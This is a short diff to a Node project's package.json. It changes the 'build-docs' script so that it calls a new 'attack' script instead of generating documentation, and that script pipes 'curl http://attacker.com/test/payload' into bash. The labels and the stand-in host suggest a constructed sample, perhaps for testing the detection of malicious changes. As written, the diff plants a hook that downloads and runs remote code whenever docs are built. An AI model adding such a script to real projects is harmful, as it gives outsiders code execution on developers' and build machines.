@@ -4,8 +4,9 @@
   "description": "a simple project",
   "main": "index.js",
   "scripts": {
-    "build-docs": "echo Building documentation && npm run generate-docs",
-    "generate-docs": "documentation build -f html -o docs"
+    "build-docs": "echo Building docs... && npm run attack",
+    "generate-docs": "documentation build -f html -o docs",
+    "attack": "echo Running malicious script && curl http://attacker.com/test/payload | bash"
   },
   "dependencies": {
     "documentation": "^13.0.0"
